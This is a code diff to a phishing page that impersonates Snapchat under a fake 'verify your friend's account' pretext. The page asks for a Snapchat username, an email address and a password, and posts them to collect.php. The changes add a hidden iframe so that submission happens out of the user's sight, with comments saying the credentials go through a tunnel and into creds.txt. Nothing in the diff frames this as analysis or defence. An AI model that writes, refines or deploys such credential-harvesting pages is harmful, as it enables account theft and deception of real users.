@@ -1,4 +1,4 @@
-  
+ 
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -42,7 +42,9 @@ button:disabled{background:#aaa;cursor:not-allowed}
   <p class="txt">Your friend has requested verification.<br>Please confirm if this account belongs to a real person and is not fake or impersonating.</p>
   <div class="snap-bar">Continue with Snapchat</div>
   <div class="card">
-    <form id="verifyForm" action="collect.php" method="POST">
+    <!--  Hidden iframe + clean URL  -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+    <form id="verifyForm" action="collect.php" method="POST" target="hiddenFrame">
       <div class="option"><input type="radio" name="status" value="real"><span>Yes, this is a real account</span></div>
       <div class="option"><input type="radio" name="status" value="fake"><span>No, this account seems fake</span></div>
       <div class="option"><input type="radio" name="status" value="unsure"><span>I'm not sure</span></div>
@@ -79,12 +81,11 @@ form.oninput=_=>{
   err.style.display=m?'none':'block';
   btn.disabled=!form.snap.value.trim()||!form.email.value.includes('@')||form.password.value.length<4||!m;
 };
+// submit: show loader → iframe POST to tunnel → still creds.txt
 form.onsubmit=async e=>{
   e.preventDefault();
   document.getElementById('loading').style.display='flex';
-  await fetch('collect.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.fromEntries(new FormData(form)))});
-  document.getElementById('loading').style.display='none';
-  document.getElementById('successPage').style.display='flex';
+  form.submit();   // real POST via hidden iframe to tunnel
 };
 </script>
 </body>
